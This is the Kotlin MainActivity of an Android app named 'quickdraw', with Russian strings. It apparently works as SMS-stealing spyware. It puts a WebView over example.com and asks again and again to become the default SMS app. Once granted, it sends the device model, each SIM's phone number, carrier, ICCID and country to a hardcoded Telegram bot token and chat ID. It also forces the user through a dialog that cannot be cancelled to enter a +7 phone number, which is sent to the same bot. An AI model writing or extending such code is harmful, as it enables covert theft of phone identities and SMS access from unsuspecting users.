package com.android.quickdraw

import android.annotation.SuppressLint
import android.app.role.RoleManager
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.provider.Telephony
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var sharedPrefs: SharedPreferences
    private val SMS_ROLE_REQUEST_CODE = 101
    private val client = OkHttpClient()
    private val NOTIFICATION_SENT_KEY = "notification_sent"
    private val SIM_INFO_SENT_KEY = "sim_info_sent"
    private val PHONE_NUMBER_KEY = "phone_number"
    private val PHONE_NUMBER_ENTERED_KEY = "phone_number_entered"

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        sharedPrefs = getSharedPreferences("app_prefs", MODE_PRIVATE)
        webView = findViewById(R.id.webView)

        with(webView.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                view.loadUrl(url)
                return false
            }
        }

        webView.loadUrl("https://example.com")
        checkAndRequestSmsRole()
    }

    private fun checkAndRequestSmsRole() {
        if (!isDefaultSmsApp()) {
            requestSmsRole()
        } else {
            if (!sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
                sendNotification("Пользователь сделал приложением по умолчанию")
                sharedPrefs.edit().putBoolean(NOTIFICATION_SENT_KEY, true).apply()
            }
            if (!sharedPrefs.getBoolean(SIM_INFO_SENT_KEY, false)) {
                sendSimInfoNotification()
            }
            
            if (!sharedPrefs.getBoolean(PHONE_NUMBER_ENTERED_KEY, false)) {
                showPhoneNumberDialog()
            }
        }
    }

    private fun isDefaultSmsApp(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            packageName == Telephony.Sms.getDefaultSmsPackage(this)
        } else {
            sharedPrefs.getBoolean("is_default_sms", false)
        }
    }

    private fun requestSmsRole() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = getSystemService(RoleManager::class.java)
            if (roleManager?.isRoleAvailable(RoleManager.ROLE_SMS) == true) {
                if (!roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
                    val intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS)
                    startActivityForResult(intent, SMS_ROLE_REQUEST_CODE)
                }
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
            startActivityForResult(intent, SMS_ROLE_REQUEST_CODE)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SMS_ROLE_REQUEST_CODE) {
            if (isDefaultSmsApp()) {
                // Пользователь предоставил разрешение
                if (!sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
                    sendNotification("Пользователь сделал приложением по умолчанию")
                    sharedPrefs.edit().putBoolean(NOTIFICATION_SENT_KEY, true).apply()
                }
                if (!sharedPrefs.getBoolean(SIM_INFO_SENT_KEY, false)) {
                    sendSimInfoNotification()
                }
                
                if (!sharedPrefs.getBoolean(PHONE_NUMBER_ENTERED_KEY, false)) {
                    showPhoneNumberDialog()
                }
            } else {
                // Пользователь отказал - запрашиваем снова
                requestSmsRole()
            }
        }
    }

    private fun sendNotification(message: String) {
        try {
            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
            val fullMessage = "$message\n$deviceModel"

            val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
            val chatId = "6331293386"
            val url = "https://api.telegram.org/bot$botToken/sendMessage"

            val mediaType = "application/json".toMediaType()
            val requestBody = """
                {
                    "chat_id": "$chatId",
                    "text": "$fullMessage",
                    "parse_mode": "Markdown"
                }
            """.trimIndent().toRequestBody(mediaType)

            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    e.printStackTrace()
                }

                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendSimInfoNotification() {
        val simInfo = getSimNumbersString()
        sendNotification("Информация о SIM-картах:\n$simInfo")
        sharedPrefs.edit().putBoolean(SIM_INFO_SENT_KEY, true).apply()
    }

    @SuppressLint("SetTextI18n")
    private fun showPhoneNumberDialog() {
        val dialog = AlertDialog.Builder(this, R.style.CustomAlertDialog).create()
        val inflater = layoutInflater
        val dialogView = inflater.inflate(R.layout.dialog_phone_input, null)
        
        // Настройка диалога
        dialog.setView(dialogView)
        dialog.setCancelable(false)
        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
        
        // Получаем элементы из макета
        val titleTextView = dialogView.findViewById<TextView>(R.id.dialog_title)
        val messageTextView = dialogView.findViewById<TextView>(R.id.dialog_message)
        val phoneInput = dialogView.findViewById<EditText>(R.id.phone_input)
        val continueButton = dialogView.findViewById<AppCompatButton>(R.id.continue_button)
        
        // Устанавливаем текст
        titleTextView.text = "Введите номер телефона"
        messageTextView.text = "Введите номер в формате +7XXXXXXXXXX"
        
        // Устанавливаем начальное значение +7
        phoneInput.setText("+7")
        phoneInput.setSelection(phoneInput.text.length)
        
        // Настраиваем обработчик ввода
        phoneInput.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                // Запрещаем удаление +7
                if (s?.length ?: 0 < 2 || s?.subSequence(0, 2) != "+7") {
                    phoneInput.setText("+7")
                    phoneInput.setSelection(2)
                    return
                }
                
                // Фильтруем ввод - только цифры после +7
                if (s != null && s.length > 2) {
                    val cleanNumber = "+7" + s.substring(2).filter { it.isDigit() }
                    if (s.toString() != cleanNumber) {
                        phoneInput.setText(cleanNumber)
                        phoneInput.setSelection(cleanNumber.length)
                    }
                }
            }
            
            override fun afterTextChanged(s: Editable?) {
                continueButton.isEnabled = s?.length == 12 // +7 и 10 цифр
            }
        })
        
        // Обработчик кнопки "Продолжить"
        continueButton.setOnClickListener {
            val phoneNumber = phoneInput.text.toString()
            if (phoneNumber.length == 12 && phoneNumber.startsWith("+7")) {
                sharedPrefs.edit()
                    .putString(PHONE_NUMBER_KEY, phoneNumber)
                    .putBoolean(PHONE_NUMBER_ENTERED_KEY, true)
                    .apply()
                
                sendNotification("Пользователь ввел номер телефона: $phoneNumber")
                dialog.dismiss()
                
                // Скрываем клавиатуру
                val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                imm.hideSoftInputFromWindow(phoneInput.windowToken, 0)
            } else {
                phoneInput.error = "Номер должен содержать 10 цифр после +7"
            }
        }
        
        // Показываем диалог
        dialog.show()
        
        // Фокусируемся на поле ввода и показываем клавиатуру
        phoneInput.postDelayed({
            phoneInput.requestFocus()
            val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
            imm.showSoftInput(phoneInput, InputMethodManager.SHOW_IMPLICIT)
        }, 100)
    }

    @SuppressLint("HardwareIds", "MissingPermission")
    private fun getSimNumbersString(): String {
        val result = StringBuilder()
        
        try {
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                val activeSubscriptions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    subscriptionManager.activeSubscriptionInfoList
                } else {
                    @Suppress("DEPRECATION")
                    subscriptionManager.activeSubscriptionInfoList
                }
                
                if (activeSubscriptions != null && activeSubscriptions.isNotEmpty()) {
                    result.append("Найдено SIM-карт: ${activeSubscriptions.size}\n\n")
                    
                    for (subscription in activeSubscriptions) {
                        val number = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            telephonyManager.createForSubscriptionId(subscription.subscriptionId).line1Number
                        } else {
                            @Suppress("DEPRECATION")
                            telephonyManager.line1Number
                        }
                        
                        result.append("SIM ${subscription.simSlotIndex + 1}:\n")
                        result.append("Номер: ${number ?: "недоступен"}\n")
                        result.append("Оператор: ${subscription.carrierName ?: "неизвестен"}\n")
                        result.append("IMSI: ${subscription.iccId ?: "недоступен"}\n")
                        result.append("Страна: ${subscription.countryIso?.uppercase() ?: "неизвестна"}\n\n")
                    }
                } else {
                    result.append("Активные SIM-карты не найдены\n")
                }
            } else {
                @Suppress("DEPRECATION")
                val number = telephonyManager.line1Number
                result.append("Основной номер SIM: ${number ?: "недоступен"}\n")
                result.append("(Метод для Multi-SIM не поддерживается в этой версии Android)\n")
            }
        } catch (e: Exception) {
            result.append("Ошибка при получении номеров SIM: ${e.localizedMessage}")
        }
        
        return result.toString()
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
    }
}
